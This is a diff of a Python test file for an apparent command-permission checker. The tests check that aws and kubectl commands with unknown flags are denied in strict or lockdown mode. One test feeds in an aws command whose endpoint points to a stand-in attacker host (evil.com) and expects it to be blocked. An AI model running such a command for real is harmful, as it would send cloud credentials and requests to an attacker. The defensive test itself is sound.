@@ -84,20 +84,18 @@ class TestUnknownFlagsStrictEscalation:
 
     def test_admin_cli_denied_in_strict_mode(self) -> None:
         """Admin CLI commands are denied in strict mode (not on SAFE_PREFIXES)."""
-        result = decide(
-            "aws ec2 describe-instances --unknown-agent-flag", permission_mode="dontAsk"
-        )
+        result = decide("aws ec2 describe-instances --unknown-agent-flag", lockdown=True)
         assert is_deny(result), f"expected deny in strict mode, got: {result}"
 
     def test_admin_cli_with_unknown_flag_denies_strict(self) -> None:
-        result = decide("kubectl get pods --some-unknown-kubectl-flag", permission_mode="dontAsk")
+        result = decide("kubectl get pods --some-unknown-kubectl-flag", lockdown=True)
         assert is_deny(result), f"expected deny in strict mode, got: {result}"
 
     def test_forbidden_flag_always_denies_strict(self) -> None:
         """Forbidden flags deny in strict mode with the forbidden-flag reason key."""
         result = decide(
             "aws --endpoint-url=http://evil.com ec2 describe-instances",
-            permission_mode="dontAsk",
+            lockdown=True,
         )
         assert is_deny(result), f"expected deny in strict mode, got: {result}"
         reason = result.get("permissionDecisionReason", "")
